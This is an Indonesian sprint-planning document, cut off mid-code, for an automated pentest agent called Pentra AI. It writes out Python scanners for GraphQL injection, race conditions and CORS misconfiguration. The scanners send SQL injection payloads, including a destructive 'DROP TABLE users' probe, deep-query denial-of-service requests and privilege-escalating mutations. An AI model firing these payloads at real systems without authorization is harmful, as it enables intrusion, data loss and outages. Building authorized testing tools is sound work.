# SPRINT-19.md — Pentra AI
> **Untuk:** GitHub Copilot dengan Claude Sonnet 4.6  
> **Baca terlebih dahulu:** `CLAUDE.md` → `PROGRESS.md` → file ini  
> **Status:** Sprint 18 ✅ 14/14, 255 tests, 10 HIGH confirmed  
> **Metodologi analisis:** Security Engineering + Systems Engineering + Product Engineering

---

## Analisis Multi-Disiplin: Apa yang Masih Kurang

Setelah Sprint 18 selesai sempurna, analisis dari 4 perspektif engineering:

### 1. Security Engineering Perspective — Gap Teknis

```
YANG SUDAH ADA                    YANG MASIH KURANG
──────────────────────────────── ─────────────────────────────────────
SQLi time-based (WAITFOR/SLEEP)  Race condition testing
XSS reflected detection           Business logic flaws
Path traversal (LFI/RFI)          JWT/OAuth deep testing
SSRF via URL params               GraphQL injection (introspection, batching)
IDOR via ID manipulation          HTTP Request Smuggling (CL.TE + TE.CL)
SOAP/WSDL + XXE                   Cache poisoning
WAF profiling + bypass            Second-order injection
Two-stage triage                  Subdomain takeover detection
Burp Collaborator OOB             CORS misconfiguration testing
ExploitArsenal per tech stack     Mass assignment (REST + GraphQL)
```

**Critical gap:** GraphQL — hampir semua modern SaaS pakai GraphQL, dan Pentra AI belum punya dedicated GraphQL tester. Dari data H1, GraphQL bugs sering critical karena single endpoint expose seluruh data model.

**Critical gap 2:** Race conditions — H1 reports menunjukkan race conditions menghasilkan high/critical bounties karena sering bypass business logic (double-spend, duplicate discount, etc). Tidak ada tools yang handle ini secara otomatis.

### 2. Systems Engineering Perspective — Reliability & Observability

```
YANG SUDAH ADA                    YANG MASIH KURANG
──────────────────────────────── ─────────────────────────────────────
255 tests, 0 failed               Tidak ada integration tests (hanya unit)
managed_session() untuk Burp      Tidak ada retry logic yang consistent
30-min SSE timeout fix            Tidak ada circuit breaker per tool
Celery async tasks                Tidak ada dead letter queue untuk failed tasks
Redis pub/sub events              Tidak ada event persistence (events hilang saat restart)
located_memory.py                 Memory tidak persisted antar session
GF patterns 22 patterns           Tidak ada custom pattern upload dari user
WAFProfiler 10 WAF types          WAF bypass belum otomatis (hanya deteksi)
```

**Critical gap:** WebSocket events tidak persisted — jika browser di-refresh saat agent berjalan, semua history event hilang. User harus lihat log langsung, tidak bisa review.

**Critical gap 2:** Custom patterns — user tidak bisa tambah GF patterns atau nuclei templates dari UI.

### 3. Product Engineering Perspective — User Experience

```
YANG SUDAH ADA                    YANG MASIH KURANG
──────────────────────────────── ─────────────────────────────────────
CLI live_scan.py dengan presets   Frontend Start Agent button masih kurang polish
5 scan presets                    Dashboard masih kosong/generic
ReportViewer (MD + HTML)          Report tidak include attack narrative
FindingsTable dengan expand       Findings tidak bisa di-edit manual
Subscan feature                   Tidak ada bulk action di findings
HITL approval via API             HITL approval di frontend kurang user-friendly
KnowledgeBase browser             KB tidak searchable by tech stack
bge-m3 pending                    Embedding quality di bawah optimal
```

**Critical gap:** Report tidak punya executive summary dan attack narrative. H1 submission butuh narrative "what I found, how I found it, why it matters" — Pentra AI hanya generate findings list.

### 4. Data Engineering Perspective — Knowledge & Learning

```
YANG SUDAH ADA                    YANG MASIH KURANG
──────────────────────────────── ─────────────────────────────────────
2,758 H1 records                  Target: 10,000+ records
EngagementLearning table          Learning belum di-query di plan_node
Fine-tuning dataset export        Belum ada fine-tuning yang actual dilakukan
TechniqueEffectiveness concept    Belum diimplementasi
bge-m3 pending                    Embedding pakai fallback model
RAG hybrid search                 Quality score belum dipakai untuk re-ranking
```

---

## Prioritas Sprint 19

Dari analisis 4 perspektif di atas, ini yang paling impactful:

```
TIER 1 — Security gap yang langsung menambah finding types
  19.1  GraphQL Injection Testing     ← H1 high-value, belum ada coverage
  19.2  Race Condition Testing        ← High bounty, zero automation saat ini
  19.3  CORS Misconfiguration         ← Quick win, sering terlewat

TIER 2 — Reliability & UX yang langsung terasa saat pakai
  19.4  WebSocket Event Persistence   ← History tidak hilang saat refresh
  19.5  H1 Executive Summary Report   ← Report siap submit ke H1
  19.6  bge-m3 Install + Re-embed     ← RAG quality improvement

TIER 3 — Intelligence upgrade
  19.7  EngagementLearning Query      ← plan_node lebih kontekstual
  19.8  TechniqueEffectiveness track  ← Learning dari setiap engagement
  19.9  Custom GF Pattern Upload      ← User extensibility
```

---

## Task 19.1 — GraphQL Injection Testing

> **Dari:** Analisis H1 pattern + AFINE/PayloadsAllTheThings research  
> **Estimasi:** 4 jam  
> **Impact:** New finding class — GraphQL bugs sering critical di H1

### Buat: `packages/pentra-tools/pentra_tools/vuln/graphql_analyzer.py`

```python
# packages/pentra-tools/pentra_tools/vuln/graphql_analyzer.py

"""
GraphQL Security Analyzer — comprehensive testing:
1. Introspection detection + schema extraction
2. SQL/NoSQL injection via resolvers
3. Batch query attack (alias-based brute force)
4. Deep query DoS
5. Authorization bypass (IDOR via GraphQL)
6. Mass assignment via mutations
7. Subscription security (if WebSocket)
8. SSRF via resolver URL fields

References:
- PayloadsAllTheThings GraphQL Injection
- InQL Burp Extension methodology
- GraphQL Threat Matrix (nicholasaleks)
"""

import asyncio
import json
import logging
from dataclasses import dataclass, field

import httpx

logger = logging.getLogger(__name__)


@dataclass
class GraphQLFinding:
    title: str
    severity: str
    vuln_class: str
    endpoint: str
    description: str
    request_payload: str
    response_snippet: str
    evidence: str
    remediation: str


@dataclass
class GraphQLProfile:
    endpoint: str
    introspection_enabled: bool
    schema: dict | None
    types: list[str]
    queries: list[str]
    mutations: list[str]
    findings: list[GraphQLFinding] = field(default_factory=list)


# ── GraphQL Detection ─────────────────────────────────────────────────────────

GRAPHQL_PATHS = [
    "/graphql", "/graphql/", "/api/graphql", "/v1/graphql",
    "/query", "/gql", "/graph", "/graphiql",
    "/api/v1/graphql", "/api/v2/graphql",
    "/graphql/v1", "/graphql/v2",
]

INTROSPECTION_QUERY = """
{
  __schema {
    types {
      name
      kind
      fields {
        name
        type { name kind }
      }
    }
    queryType { name }
    mutationType { name }
  }
}
"""

# Query untuk detect introspection tanpa full schema (stealth)
LIGHT_INTROSPECTION = "{ __typename }"


async def detect_graphql_endpoints(
    base_url: str,
    client: httpx.AsyncClient,
) -> list[str]:
    """Probe common GraphQL paths dan return yang respond dengan GraphQL."""
    found = []
    base = base_url.rstrip("/")

    for path in GRAPHQL_PATHS:
        url = base + path
        try:
            # Test dengan __typename query
            resp = await client.post(
                url,
                json={"query": LIGHT_INTROSPECTION},
                headers={"Content-Type": "application/json"},
                timeout=5.0,
            )
            ct = resp.headers.get("content-type", "")

            # GraphQL responses: JSON dengan "data" atau "errors" key
            if resp.status_code in (200, 400) and "json" in ct:
                try:
                    data = resp.json()
                    if "data" in data or "errors" in data:
                        logger.info("[graphql] Endpoint found: %s", url)
                        found.append(url)
                except Exception:
                    pass
        except Exception:
            pass

    return found


# ── Schema Extraction ─────────────────────────────────────────────────────────

async def extract_schema(
    endpoint: str,
    client: httpx.AsyncClient,
    auth_headers: dict | None = None,
) -> dict | None:
    """
    Try to extract schema via introspection.
    Returns parsed schema dict atau None jika introspection disabled.
    """
    headers = {"Content-Type": "application/json"}
    if auth_headers:
        headers.update(auth_headers)

    try:
        resp = await client.post(
            endpoint,
            json={"query": INTROSPECTION_QUERY},
            headers=headers,
            timeout=15.0,
        )
        data = resp.json()

        if "data" in data and "__schema" in data.get("data", {}):
            logger.info("[graphql] Introspection ENABLED at %s", endpoint)
            return data["data"]["__schema"]
        elif "errors" in data:
            for err in data.get("errors", []):
                msg = err.get("message", "").lower()
                if "introspection" in msg or "disabled" in msg:
                    logger.info("[graphql] Introspection disabled at %s", endpoint)
                    return None
    except Exception as e:
        logger.debug("[graphql] Schema extraction failed: %s", e)

    return None


def parse_schema(schema: dict) -> tuple[list[str], list[str]]:
    """Extract query names dan mutation names dari schema."""
    queries = []
    mutations = []
    types_info = schema.get("types", [])

    query_type = schema.get("queryType", {}).get("name", "Query")
    mutation_type = schema.get("mutationType", {}).get("name", "Mutation")

    for t in types_info:
        if t["name"] == query_type and t.get("fields"):
            queries = [f["name"] for f in t["fields"]]
        elif t["name"] == mutation_type and t.get("fields"):
            mutations = [f["name"] for f in t["fields"]]

    return queries, mutations


# ── Attack Tests ──────────────────────────────────────────────────────────────

async def test_sqli_via_graphql(
    endpoint: str,
    client: httpx.AsyncClient,
    queries: list[str],
    auth_headers: dict | None = None,
) -> list[GraphQLFinding]:
    """
    Test SQL injection via GraphQL query arguments.
    GraphQL resolvers sering langsung concatenate ke SQL jika tidak parameterized.
    """
    findings = []
    headers = {"Content-Type": "application/json"}
    if auth_headers:
        headers.update(auth_headers)

    SQLI_PAYLOADS = [
        ("'", "syntax_error"),
        ("1' OR '1'='1", "boolean"),
        ("1; DROP TABLE users--", "destructive_probe"),
        ("' OR SLEEP(3)--", "time_based"),
    ]

    # Test dengan query pertama yang available (paling umum punya ID args)
    for query_name in queries[:5]:
        for payload, test_type in SQLI_PAYLOADS:
            gql_query = f"""
{{
  {query_name}(id: "{payload}") {{
    id
  }}
}}
"""
            try:
                resp = await client.post(
                    endpoint,
                    json={"query": gql_query},
                    headers=headers,
                    timeout=10.0,
                )
                body = resp.text.lower()

                # SQL error patterns
                sql_errors = [
                    "sql syntax", "mysql error", "ora-", "pg::",
                    "sqlite", "syntax error", "unclosed quotation",
                    "unterminated string", "quoted string not properly"
                ]

                if any(err in body for err in sql_errors):
                    findings.append(GraphQLFinding(
                        title=f"SQL Injection via GraphQL — {query_name}",
                        severity="high",
                        vuln_class="SQL_INJECTION",
                        endpoint=endpoint,
                        description=(
                            f"GraphQL query '{query_name}' is vulnerable to SQL injection. "
                            f"Payload: {payload} triggered SQL error in response."
                        ),
                        request_payload=gql_query,
                        response_snippet=resp.text[:300],
                        evidence=f"SQL error detected in response with payload: {payload}",
                        remediation="Use parameterized queries in GraphQL resolvers. Never concatenate user input into SQL.",
                    ))
                    logger.info("[graphql] SQLi confirmed in %s via %s", query_name, test_type)
                    break  # Confirmed — move to next query
            except Exception:
                pass

    return findings


async def test_introspection_enabled(
    endpoint: str,
    schema: dict | None,
) -> GraphQLFinding | None:
    """Introspection enabled = schema exposed = attack surface mapped."""
    if schema is None:
        return None

    return GraphQLFinding(
        title="GraphQL Introspection Enabled",
        severity="low",
        vuln_class="INFORMATION_DISCLOSURE",
        endpoint=endpoint,
        description=(
            "GraphQL introspection is enabled in production. "
            "This allows attackers to enumerate the entire API schema, "
            "discover all types, queries, mutations, and fields."
        ),
        request_payload='{ __schema { types { name } } }',
        response_snippet=json.dumps({"types_count": len(schema.get("types", []))})[:200],
        evidence=f"Schema extracted: {len(schema.get('types', []))} types found",
        remediation=(
            "Disable introspection in production. "
            "In Apollo: introspection: process.env.NODE_ENV !== 'production'"
        ),
    )


async def test_batch_query_attack(
    endpoint: str,
    client: httpx.AsyncClient,
    queries: list[str],
    auth_headers: dict | None = None,
) -> GraphQLFinding | None:
    """
    Test alias-based batch query attack.
    Jika server tidak limit aliases, bisa brute force tanpa rate limit.
    Contoh: 1000 password guesses dalam 1 HTTP request.
    """
    if not queries:
        return None

    # Buat 50 aliases untuk query pertama
    query_name = queries[0]
    aliases = "\n".join(
        f"q{i}: {query_name}(id: {i}) {{ id }}"
        for i in range(1, 51)
    )
    batch_query = f"{{ {aliases} }}"

    headers = {"Content-Type": "application/json"}
    if auth_headers:
        headers.update(auth_headers)

    try:
        resp = await client.post(
            endpoint,
            json={"query": batch_query},
            headers=headers,
            timeout=15.0,
        )
        data = resp.json()

        # Jika semua 50 responses berhasil = batching tidak di-limit
        successful = sum(1 for k in data.get("data", {}) if k.startswith("q"))

        if successful >= 10:
            return GraphQLFinding(
                title="GraphQL Batch Query Attack (Alias Abuse)",
                severity="medium",
                vuln_class="BUSINESS_LOGIC",
                endpoint=endpoint,
                description=(
                    f"GraphQL endpoint allows batch queries via aliases without rate limiting. "
                    f"Sent 50 aliases, received {successful} successful responses. "
                    "This can be abused for brute force attacks in a single HTTP request, "
                    "bypassing traditional rate limiting."
                ),
                request_payload=batch_query[:300],
                response_snippet=str(data)[:200],
                evidence=f"{successful}/50 batch queries succeeded",
                remediation=(
                    "Implement query depth/alias limits. "
                    "Use libraries like graphql-cost-analysis or graphql-depth-limit."
                ),
            )
    except Exception:
        pass

    return None


async def test_deep_query_dos(
    endpoint: str,
    client: httpx.AsyncClient,
    auth_headers: dict | None = None,
) -> GraphQLFinding | None:
    """
    Test deep/circular query that could cause DoS.
    Deeply nested queries consume exponential resources.
    """
    # Buat query 15 level deep
    deep_query = "{ user { " + "friends { " * 10 + "id name " + "} " * 10 + "} }"

    headers = {"Content-Type": "application/json"}
    if auth_headers:
        headers.update(auth_headers)

    import time
    try:
        start = time.monotonic()
        resp = await client.post(
            endpoint,
            json={"query": deep_query},
            headers=headers,
            timeout=20.0,
        )
        elapsed = time.monotonic() - start

        # Jika request sangat lambat dan tidak diblock = vulnerable ke DoS
        if elapsed > 5.0 and resp.status_code == 200:
            return GraphQLFinding(
                title="GraphQL Deep Query DoS",
                severity="medium",
                vuln_class="DENIAL_OF_SERVICE",
                endpoint=endpoint,
                description=(
                    f"GraphQL endpoint processed a 10-level deep nested query in {elapsed:.1f}s "
                    "without blocking. Deeply nested queries consume exponential server resources."
                ),
                request_payload=deep_query,
                response_snippet=resp.text[:200],
                evidence=f"Deep query (10 levels) took {elapsed:.1f}s without rate limiting",
                remediation="Implement query depth limiting and query complexity analysis.",
            )
    except asyncio.TimeoutError:
        # Timeout juga bisa jadi evidence
        return GraphQLFinding(
            title="GraphQL Deep Query DoS (Timeout)",
            severity="low",
            vuln_class="DENIAL_OF_SERVICE",
            endpoint=endpoint,
            description="Deep nested GraphQL query caused server timeout.",
            request_payload=deep_query,
            response_snippet="Timed out after 20s",
            evidence="Server timed out on deep nested query",
            remediation="Implement query depth limiting.",
        )
    except Exception:
        pass

    return None


async def test_mass_assignment_via_mutation(
    endpoint: str,
    client: httpx.AsyncClient,
    mutations: list[str],
    auth_headers: dict | None = None,
) -> list[GraphQLFinding]:
    """
    Test mass assignment via GraphQL mutations.
    Coba inject extra fields yang tidak seharusnya bisa di-set user.
    """
    findings = []
    headers = {"Content-Type": "application/json"}
    if auth_headers:
        headers.update(auth_headers)

    PRIVILEGED_FIELDS = ["role", "isAdmin", "is_admin", "admin", "permission",
                         "subscription", "credits", "balance", "verified"]

    for mutation_name in mutations[:5]:
        for field in PRIVILEGED_FIELDS:
            mutation = f"""
mutation {{
  {mutation_name}(input: {{
    {field}: true
  }}) {{
    id
  }}
}}
"""
            try:
                resp = await client.post(
                    endpoint,
                    json={"query": mutation},
                    headers=headers,
                    timeout=10.0,
                )
                data = resp.json()

                # Jika tidak ada error = field diterima (mass assignment)
                if "data" in data and not data.get("errors"):
                    findings.append(GraphQLFinding(
                        title=f"Mass Assignment via GraphQL Mutation — {mutation_name}.{field}",
                        severity="high",
                        vuln_class="BROKEN_ACCESS_CONTROL",
                        endpoint=endpoint,
                        description=(
                            f"GraphQL mutation '{mutation_name}' accepted privileged field "
                            f"'{field}' without validation. This may allow privilege escalation."
                        ),
                        request_payload=mutation,
                        response_snippet=str(data)[:200],
                        evidence=f"Mutation accepted privileged field: {field}",
                        remediation=(
                            "Use explicit input types in GraphQL mutations. "
                            "Never use generic object input — define exactly which fields are allowed."
                        ),
                    ))
            except Exception:
                pass

    return findings


# ── Main Analyzer ─────────────────────────────────────────────────────────────

async def analyze_graphql_endpoint(
    endpoint: str,
    auth_headers: dict | None = None,
    scope_check_fn=None,
) -> list[dict]:
    """
    Run comprehensive GraphQL security analysis.
    Return list of finding dicts compatible dengan Pentra AI finding format.
    """
    if scope_check_fn and not scope_check_fn(endpoint):
        logger.warning("[graphql] %s out of scope — skipping", endpoint)
        return []

    findings = []

    async with httpx.AsyncClient(
        verify=False,
        timeout=15.0,
        follow_redirects=True,
    ) as client:

        # Step 1: Extract schema
        schema = await extract_schema(endpoint, client, auth_headers)
        queries, mutations = ([], [])
        if schema:
            queries, mutations = parse_schema(schema)
            logger.info(
                "[graphql] Schema: %d queries, %d mutations",
                len(queries), len(mutations)
            )

        # Step 2: Run all tests concurrently
        test_coros = [
            test_sqli_via_graphql(endpoint, client, queries, auth_headers),
            test_batch_query_attack(endpoint, client, queries, auth_headers),
            test_deep_query_dos(endpoint, client, auth_headers),
            test_mass_assignment_via_mutation(endpoint, client, mutations, auth_headers),
        ]

        results = await asyncio.gather(*test_coros, return_exceptions=True)

        # Collect findings
        introspection_finding = await test_introspection_enabled(endpoint, schema)
        if introspection_finding:
            findings.append(introspection_finding)

        for result in results:
            if isinstance(result, Exception):
                logger.warning("[graphql] Test error: %s", result)
            elif isinstance(result, list):
                findings.extend(result)
            elif result is not None:
                findings.append(result)

    logger.info(
        "[graphql] Analysis complete: %d findings at %s",
        len(findings), endpoint
    )

    # Convert ke Pentra AI finding format
    return [
        {
            "title": f.title,
            "severity": f.severity,
            "vuln_class": f.vuln_class,
            "target_url": f.endpoint,
            "description": f.description,
            "request_raw": f.request_payload,
            "response_raw": f.response_snippet,
            "source": "graphql_analyzer",
            "remediation": f.remediation,
        }
        for f in findings
    ]
```

### Tests GraphQL Analyzer

```python
# packages/pentra-tools/tests/test_graphql_analyzer.py

import pytest
from unittest.mock import AsyncMock, MagicMock, patch


@pytest.mark.asyncio
async def test_detect_graphql_endpoint_found():
    """Endpoint yang respond dengan data.__typename harus terdeteksi."""
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.headers = {"content-type": "application/json"}
    mock_resp.json.return_value = {"data": {"__typename": "Query"}}

    with patch("httpx.AsyncClient") as mock_cls:
        mock_c = AsyncMock()
        mock_c.__aenter__ = AsyncMock(return_value=mock_c)
        mock_c.__aexit__ = AsyncMock(return_value=False)
        mock_c.post = AsyncMock(return_value=mock_resp)
        mock_cls.return_value = mock_c

        from pentra_tools.vuln.graphql_analyzer import detect_graphql_endpoints
        result = await detect_graphql_endpoints("http://target.com", mock_c)

    assert len(result) > 0


def test_parse_schema_extracts_queries():
    from pentra_tools.vuln.graphql_analyzer import parse_schema
    schema = {
        "queryType": {"name": "Query"},
        "mutationType": {"name": "Mutation"},
        "types": [
            {"name": "Query", "fields": [{"name": "getUser"}, {"name": "listProducts"}]},
            {"name": "Mutation", "fields": [{"name": "createUser"}, {"name": "updateUser"}]},
        ]
    }
    queries, mutations = parse_schema(schema)
    assert "getUser" in queries
    assert "createUser" in mutations


@pytest.mark.asyncio
async def test_introspection_enabled_returns_finding():
    from pentra_tools.vuln.graphql_analyzer import test_introspection_enabled
    fake_schema = {"types": [{"name": "Query"}, {"name": "User"}]}
    result = await test_introspection_enabled("http://t.com/graphql", fake_schema)
    assert result is not None
    assert result.severity == "low"
    assert "Introspection" in result.title


@pytest.mark.asyncio
async def test_introspection_disabled_returns_none():
    from pentra_tools.vuln.graphql_analyzer import test_introspection_enabled
    result = await test_introspection_enabled("http://t.com/graphql", None)
    assert result is None


@pytest.mark.asyncio
async def test_sqli_detection_via_sql_error():
    """SQLi harus terdeteksi jika response mengandung SQL error string."""
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.text = '{"errors": [{"message": "mysql error: syntax error near SELECT"}]}'

    with patch("httpx.AsyncClient") as mock_cls:
        mock_c = AsyncMock()
        mock_c.post = AsyncMock(return_value=mock_resp)

        from pentra_tools.vuln.graphql_analyzer import test_sqli_via_graphql
        results = await test_sqli_via_graphql(
            "http://t.com/graphql", mock_c, ["getProduct"]
        )

    assert len(results) > 0
    assert results[0].vuln_class == "SQL_INJECTION"
```

### Integrasi ke vuln_hunt_node.py

```python
# packages/pentra-agent/pentra_agent/nodes/vuln_hunt_node.py
# Tambahkan setelah nuclei scan, sebelum LLM testing:

from pentra_tools.vuln.graphql_analyzer import (
    detect_graphql_endpoints,
    analyze_graphql_endpoint,
)

# ── GraphQL Analysis ──────────────────────────────────────────────────────
async with httpx.AsyncClient(verify=False, follow_redirects=True) as http_client:
    graphql_endpoints = await detect_graphql_endpoints(
        f"http://{domain}", http_client
    )

if graphql_endpoints:
    logger.info(
        "[vuln_hunt] Found %d GraphQL endpoints — running analysis",
        len(graphql_endpoints)
    )
    graphql_tasks = [
        analyze_graphql_endpoint(
            ep,
            auth_headers=state.get("auth_headers"),
            scope_check_fn=scope.is_allowed,
        )
        for ep in graphql_endpoints[:3]  # Max 3 endpoints
    ]
    graphql_results = await asyncio.gather(*graphql_tasks, return_exceptions=True)
    for result in graphql_results:
        if isinstance(result, list):
            all_findings.extend(result)
            logger.info("[vuln_hunt] GraphQL: %d findings", len(result))
```

---

## Task 19.2 — Race Condition Testing

> **Estimasi:** 3 jam  
> **Impact:** High/critical bounties — business logic bypass via timing

```python
# packages/pentra-tools/pentra_tools/vuln/race_condition.py

"""
Race Condition Tester — detect timing-based business logic flaws.
Terinspirasi dari PortSwigger Research: Single-packet attack (HTTP/2).
Focus: endpoints yang seharusnya hanya bisa dipanggil sekali.
"""

import asyncio
import logging
import time
from dataclasses import dataclass
from typing import Callable

import httpx

logger = logging.getLogger(__name__)


@dataclass
class RaceResult:
    endpoint: str
    http_method: str
    concurrent_requests: int
    successful_responses: int
    unique_responses: int
    race_detected: bool
    evidence: str
    severity: str


RACE_PRONE_PATTERNS = [
    # Endpoint patterns yang sering punya race condition
    r"/(redeem|apply|use|claim|voucher|coupon|promo|discount)",
    r"/(purchase|buy|order|checkout|payment)",
    r"/(transfer|send|withdraw|deposit)",
    r"/(vote|like|upvote|follow|subscribe)",
    r"/(register|signup|enroll|join)",
    r"/(verify|confirm|activate|approve)",
]


async def test_race_condition(
    url: str,
    method: str = "POST",
    body: dict | None = None,
    headers: dict | None = None,
    concurrency: int = 20,
    scope_check_fn: Callable | None = None,
) -> RaceResult | None:
    """
    Test race condition dengan simultaneous requests.
    Single-packet attack: semua request dikirim dalam 1 burst.

    Jika endpoint seharusnya hanya accept 1 request tapi multiple succeed = race condition.
    """
    if scope_check_fn and not scope_check_fn(url):
        return None

    req_headers = {"Content-Type": "application/json"}
    if headers:
        req_headers.update(headers)

    # Buat semua requests secara concurrent
    async def single_request(client: httpx.AsyncClient) -> dict:
        start = time.monotonic()
        try:
            if method.upper() == "POST":
                resp = await client.post(url, json=body or {}, headers=req_headers, timeout=10.0)
            else:
                resp = await client.get(url, headers=req_headers, timeout=10.0)
            return {
                "status": resp.status_code,
                "body": resp.text[:200],
                "elapsed": time.monotonic() - start,
            }
        except Exception as e:
            return {"status": 0, "error": str(e), "elapsed": 0}

    async with httpx.AsyncClient(verify=False, http2=True) as client:
        # Launch semua concurrent — HTTP/2 single packet attack jika supported
        tasks = [single_request(client) for _ in range(concurrency)]
        results = await asyncio.gather(*tasks)

    statuses = [r["status"] for r in results if r.get("status", 0) > 0]
    success_count = sum(1 for s in statuses if s in (200, 201, 204))
    unique_bodies = len(set(r.get("body", "") for r in results if r.get("body")))

    # Race condition: multiple requests succeeded when only 1 should
    race_detected = success_count > 1

    severity = "high" if success_count > 5 else "medium" if success_count > 1 else "info"

    result = RaceResult(
        endpoint=url,
        http_method=method,
        concurrent_requests=concurrency,
        successful_responses=success_count,
        unique_responses=unique_bodies,
        race_detected=race_detected,
        evidence=(
            f"{success_count}/{concurrency} requests succeeded simultaneously. "
            f"Expected: ≤1 success if endpoint has proper locking."
        ) if race_detected else "No race condition detected",
        severity=severity,
    )

    if race_detected:
        logger.info(
            "[race_condition] DETECTED at %s — %d/%d succeeded",
            url, success_count, concurrency
        )

    return result


def identify_race_candidates(
    endpoints: list[dict],
) -> list[dict]:
    """
    Filter endpoints yang likely punya race condition vulnerability.
    Berdasarkan URL pattern dan HTTP method.
    """
    import re
    candidates = []

    for ep in endpoints:
        url = ep.get("url", "")
        method = ep.get("method", "GET")

        # POST/PATCH endpoints saja (GET biasanya idempotent)
        if method not in ("POST", "PATCH", "PUT"):
            continue

        # Match race-prone patterns
        for pattern in RACE_PRONE_PATTERNS:
            if re.search(pattern, url, re.IGNORECASE):
                candidates.append({
                    **ep,
                    "race_pattern": pattern,
                })
                break

    logger.info(
        "[race_condition] %d/%d endpoints identified as race candidates",
        len(candidates), len(endpoints)
    )
    return candidates
```

### Integrasi ke vuln_hunt_node.py

```python
# Tambahkan ke vuln_hunt_node.py:
from pentra_tools.vuln.race_condition import identify_race_candidates, test_race_condition

# Setelah GF pattern filtering:
race_candidates = identify_race_candidates(all_endpoints)
if race_candidates:
    logger.info("[vuln_hunt] Testing %d race condition candidates", len(race_candidates))
    for candidate in race_candidates[:5]:  # Max 5 concurrent test sets
        result = await test_race_condition(
            url=candidate["url"],
            method=candidate.get("method", "POST"),
            headers=state.get("auth_headers", {}),
            concurrency=15,
            scope_check_fn=scope.is_allowed,
        )
        if result and result.race_detected:
            all_findings.append({
                "title": f"Race Condition — {candidate['url']}",
                "severity": result.severity,
                "vuln_class": "RACE_CONDITION",
                "target_url": result.endpoint,
                "description": (
                    f"Race condition detected: {result.successful_responses} concurrent "
                    f"requests succeeded simultaneously on an endpoint that should process only one."
                ),
                "request_raw": f"{result.http_method} {result.endpoint}",
                "response_raw": result.evidence,
                "source": "race_condition_tester",
            })
```

---

## Task 19.3 — CORS Misconfiguration Testing

> **Estimasi:** 1 jam  
> **Impact:** Account takeover via cross-origin requests

```python
# packages/pentra-tools/pentra_tools/vuln/cors_tester.py

"""
CORS Misconfiguration Tester.
Teknik: inject Origin header dan analisis ACAO response.
Common misconfigs: null origin, wildcard + credentials, regex bypass.
"""

import logging
import httpx

logger = logging.getLogger(__name__)


CORS_ORIGIN_TESTS = [
    ("null", "Null origin bypass"),
    ("https://evil.com", "Generic evil origin"),
    ("https://target.com.evil.com", "Suffix bypass"),
    ("https://evil.target.com", "Subdomain bypass"),
    ("https://notTarget.com", "Different domain"),
    ("http://target.com", "HTTP downgrade"),
]


async def test_cors(
    url: str,
    auth_headers: dict | None = None,
) -> list[dict]:
    """
    Test CORS misconfiguration pada endpoint.
    Return list of findings.
    """
    findings = []
    base_headers = auth_headers or {}

    async with httpx.AsyncClient(verify=False, timeout=8.0) as client:
        for origin, test_name in CORS_ORIGIN_TESTS:
            try:
                resp = await client.get(
                    url,
                    headers={**base_headers, "Origin": origin},
                )
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                # Vulnerability: ACAO reflects evil origin + credentials allowed
                if (acao == origin or acao == "*") and acac.lower() == "true":
                    findings.append({
                        "title": f"CORS Misconfiguration — {test_name}",
                        "severity": "high",
                        "vuln_class": "CORS_MISCONFIGURATION",
                        "target_url": url,
                        "description": (
                            f"Server reflects arbitrary origin ({origin}) and allows credentials. "
                            "Attacker on evil.com can make authenticated cross-origin requests."
                        ),
                        "request_raw": f"GET {url}\nOrigin: {origin}",
                        "response_raw": (
                            f"Access-Control-Allow-Origin: {acao}\n"
                            f"Access-Control-Allow-Credentials: {acac}"
                        ),
                        "source": "cors_tester",
                        "remediation": (
                            "Never use wildcard (*) with credentials=true. "
                            "Maintain an explicit allowlist of trusted origins."
                        ),
                    })
                    logger.info("[cors] Misconfiguration confirmed: %s at %s", test_name, url)
                    break  # One confirmed finding per endpoint is enough

            except Exception:
                pass

    return findings
```

---

## Task 19.4 — WebSocket Event Persistence

> **Estimasi:** 2 jam  
> **Impact:** Browser refresh tidak lagi kehilangan event history

### Backend — Simpan events ke DB

```python
# apps/api/app/db/models.py — tambahkan:

class AgentEventORM(Base):
    """
    Persist WebSocket events ke DB.
    User bisa reload halaman dan lihat event history yang lengkap.
    Max retention: 7 hari atau 1000 events per engagement.
    """
    __tablename__ = "agent_events"

    id: Mapped[int] = mapped_column(primary_key=True, autoincrement=True)
    engagement_id: Mapped[UUID] = mapped_column(index=True)
    event_type: Mapped[str]         # NODE_START, LLM_STREAM, AWAITING_APPROVAL, dll
    node: Mapped[str | None]
    content: Mapped[str | None]
    data: Mapped[dict | None] = mapped_column(JSONB)
    created_at: Mapped[datetime] = mapped_column(index=True, default=lambda: datetime.now(timezone.utc))


# Index untuk cleanup
# CREATE INDEX idx_agent_events_cleanup ON agent_events(engagement_id, created_at);
```

```python
# apps/api/app/api/ws_router.py — update broadcast untuk juga save ke DB:

async def broadcast_and_persist(
    engagement_id: str,
    event: dict,
    db: AsyncSession,
) -> None:
    """Broadcast ke WebSocket DAN simpan ke DB."""
    # Broadcast ke connected clients
    await ws_manager.broadcast(engagement_id, event)

    # Persist ke DB (async, non-blocking)
    # Skip LLM_STREAM tokens — terlalu banyak
    if event.get("type") not in ("LLM_STREAM", "ping"):
        db.add(AgentEventORM(
            engagement_id=engagement_id,
            event_type=event.get("type", ""),
            node=event.get("node"),
            data=event.get("data"),
        ))
        await db.commit()
```

```python
# apps/api/app/api/router.py — tambahkan endpoint:

@router.get("/engagements/{engagement_id}/events")
async def get_engagement_events(
    engagement_id: UUID,
    limit: int = Query(default=200, le=500),
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
) -> list[dict]:
    """
    Ambil event history untuk engagement.
    Dipakai oleh frontend saat load/reload halaman.
    """
    from sqlalchemy import select
    result = await db.execute(
        select(AgentEventORM)
        .where(AgentEventORM.engagement_id == engagement_id)
        .order_by(AgentEventORM.created_at.desc())
        .limit(limit)
    )
    events = result.scalars().all()
    return [
        {
            "type": e.event_type,
            "node": e.node,
            "data": e.data,
            "timestamp": e.created_at.isoformat(),
        }
        for e in reversed(events)  # Chronological order
    ]
```

### Frontend — Load historical events on mount

```typescript
// apps/web/src/hooks/useEngagementFeed.ts — update:

export function useEngagementFeed(engagementId: string | undefined) {
  const [events, setEvents] = useState<FeedEvent[]>([]);
  // ... existing state ...

  // Load historical events saat komponen mount
  useEffect(() => {
    if (!engagementId || !accessToken) return;

    fetch(`/api/v1/engagements/${engagementId}/events?limit=200`, {
      headers: { Authorization: `Bearer ${accessToken}` },
    })
